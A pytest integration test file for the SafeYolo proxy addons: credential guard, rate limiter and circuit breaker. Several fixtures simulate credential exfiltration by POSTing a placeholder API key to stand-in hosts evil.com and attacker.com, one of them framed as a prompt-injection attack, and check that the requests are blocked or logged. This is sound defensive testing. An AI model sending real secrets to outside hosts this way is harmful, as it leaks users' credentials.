"""
Integration tests for SafeYolo addon chain.

Tests that addons work together correctly via flow.metadata sharing.
"""

import pytest


class TestAddonChainMetadata:
    """Tests for addon communication via flow.metadata."""

    def test_credential_guard_sets_blocked_by(self, credential_guard, make_flow):
        """Test that credential_guard sets blocked_by metadata."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.metadata.get("blocked_by") == "credential-guard"
        assert flow.metadata.get("credential_prefix") is not None
        assert flow.metadata.get("blocked_host") == "evil.com"

    def test_rate_limiter_sets_blocked_by(self, rate_limiter, make_flow):
        """Test that rate_limiter sets blocked_by metadata."""
        rate_limiter._default_config.requests_per_second = 100.0
        rate_limiter._default_config.burst_capacity = 1  # burst=1 means 2 allowed

        # Exhaust limit (2 requests)
        flow1 = make_flow(url="http://test.com/api")
        rate_limiter.request(flow1)
        flow2 = make_flow(url="http://test.com/api")
        rate_limiter.request(flow2)

        # Get blocked on 3rd
        flow3 = make_flow(url="http://test.com/api")
        rate_limiter.request(flow3)

        assert flow3.metadata.get("blocked_by") == "rate-limiter"

    def test_circuit_breaker_sets_blocked_by(self, circuit_breaker, make_flow):
        """Test that circuit_breaker sets blocked_by metadata."""
        circuit_breaker.force_open("test.com")

        flow = make_flow(url="http://test.com/api")
        circuit_breaker.request(flow)

        assert flow.metadata.get("blocked_by") == "circuit-breaker"

    def test_allowed_requests_set_pass_metadata(self, credential_guard, make_flow):
        """Test that allowed requests set pass metadata."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat",
            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked
        assert flow.metadata.get("credguard_passed") is True


class TestAddonChainOrder:
    """Tests for addon execution order semantics."""

    def test_first_blocker_wins(self, credential_guard, rate_limiter, make_flow):
        """Test that first addon to block sets response."""
        # Set up rate limiter to block (burst=1 means 2 allowed)
        rate_limiter._default_config.requests_per_second = 100.0
        rate_limiter._default_config.burst_capacity = 1

        # Exhaust rate limit (2 requests)
        flow1 = make_flow(url="http://evil.com/api")
        rate_limiter.request(flow1)
        flow2 = make_flow(url="http://evil.com/api")
        rate_limiter.request(flow2)

        # Create flow that would be blocked by both addons
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        # If rate_limiter runs first (as in production chain)
        rate_limiter.request(flow)
        assert flow.response is not None
        assert flow.metadata.get("blocked_by") == "rate-limiter"

        # Now credential_guard should see response already set
        # In real mitmproxy, it wouldn't run - but we can verify behavior
        # if it did - it should see existing response and could skip

    def test_subsequent_addons_see_metadata(self, credential_guard, make_flow):
        """Test that subsequent addons can see metadata from earlier ones."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat",
            content='{"message": "hello"}',
            headers={"Content-Type": "application/json"},
        )

        # Simulate first addon setting metadata
        flow.metadata["policy"] = {
            "credential_guard": {"enabled": True},
            "yara_scanner": {"enabled": False},
        }

        # Credential guard should see this
        credential_guard.request(flow)

        # Both metadata should exist
        assert "policy" in flow.metadata
        assert "credguard_passed" in flow.metadata


class TestRealisticScenarios:
    """Tests for realistic usage scenarios."""

    def test_openai_request_through_chain(self, credential_guard, rate_limiter, circuit_breaker, make_flow, make_response):
        """Test a realistic OpenAI API request through the chain."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            content='{"model": "gpt-4", "messages": []}',
            headers={
                "Authorization": "Bearer sk-abc123xyz456def789ghijklmno",
                "Content-Type": "application/json",
            },
        )

        # Run through addons (in production order)
        rate_limiter.request(flow)
        assert flow.response is None, "Should pass rate limiter"

        circuit_breaker.request(flow)
        assert flow.response is None, "Should pass circuit breaker"

        credential_guard.request(flow)
        assert flow.response is None, "Should pass credential guard (correct host)"

        # Simulate success response
        flow.response = make_response(status_code=200)
        circuit_breaker.response(flow)

        status = circuit_breaker.get_status("api.openai.com")
        assert status.failure_count == 0

    def test_exfiltration_attempt_blocked(self, credential_guard, make_flow):
        """Test that credential exfiltration is blocked."""
        # Simulate prompt injection trying to exfiltrate key
        flow = make_flow(
            method="POST",
            url="https://attacker.com/log",
            content='{"stolen_key": "sk-abc123xyz456def789ghijklmno", "data": "user secrets"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403
        assert b"credential" in flow.response.content.lower()

    def test_circuit_opens_on_upstream_failures(self, circuit_breaker, make_flow, make_response):
        """Test circuit opens after upstream service fails repeatedly."""
        from addons.circuit_breaker import CircuitState

        circuit_breaker.failure_threshold = 3

        # Simulate 3 failed requests
        for i in range(3):
            flow = make_flow(url="http://failing-service.com/api")
            circuit_breaker.request(flow)
            flow.response = make_response(status_code=500, content=b"Internal Server Error")
            circuit_breaker.response(flow)

        # Circuit should now be open
        status = circuit_breaker.get_status("failing-service.com")
        assert status.state == CircuitState.OPEN

        # New requests should be blocked
        new_flow = make_flow(url="http://failing-service.com/api")
        circuit_breaker.request(new_flow)
        assert new_flow.response.status_code == 503


class TestEdgeCases:
    """Tests for edge cases and error handling."""

    def test_empty_body_request(self, credential_guard, make_flow):
        """Test handling of empty body requests."""
        flow = make_flow(
            method="GET",
            url="https://api.openai.com/v1/models",
            content=b"",
        )

        # Should not crash
        credential_guard.request(flow)
        assert flow.response is None

    def test_binary_body_request(self, credential_guard, make_flow):
        """Test handling of binary content."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/audio",
            content=b"\x00\x01\x02\x03binary data",
            headers={"Content-Type": "audio/wav"},
        )

        # Should not crash on binary content
        credential_guard.request(flow)
        # Body not scanned (not json/form/text content-type)
        assert flow.response is None

    def test_missing_host(self, rate_limiter, make_flow):
        """Test handling when host cannot be determined."""
        flow = make_flow(url="http://example.com/")
        # Mangle the host
        flow.request.host = ""

        # Should not crash
        rate_limiter.request(flow)


class TestBlockingMode:
    """Tests for blocking vs warn-only mode across security addons."""

    def test_credential_guard_warn_mode_passes_request(self, make_flow):
        """Test credential_guard in warn mode allows request through."""
        from addons.credential_guard import CredentialGuard, DEFAULT_RULES

        guard = CredentialGuard()
        guard.rules = list(DEFAULT_RULES)
        guard._should_block = lambda: False  # Warn-only mode

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        guard.request(flow)

        # Warn-only: no response set, request continues
        assert flow.response is None
        assert guard.violations_total == 1

    def test_warn_mode_still_logs_to_jsonl(self, make_flow, tmp_path):
        """Test that warn mode still logs violations."""
        from addons.credential_guard import CredentialGuard, DEFAULT_RULES

        guard = CredentialGuard()
        guard.rules = list(DEFAULT_RULES)
        guard._should_block = lambda: False  # Warn-only mode
        guard.log_path = tmp_path / "violations.jsonl"

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"key": "sk-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        guard.request(flow)

        # Should have logged the violation
        assert guard.log_path.exists()
        import json
        with open(guard.log_path) as f:
            log_entry = json.loads(f.readline())
        assert log_entry["event"] == "credential_violation"
        assert log_entry["rule"] == "openai"
        assert log_entry["host"] == "evil.com"

    def test_default_is_warn_only(self):
        """Test that default behavior is warn-only (no blocking)."""
        from addons.credential_guard import CredentialGuard

        # All security addons now default to warn-only mode
        # _should_block() returns False when ctx.options unavailable
        guard = CredentialGuard()
        assert guard._should_block() is False  # Default is warn-only
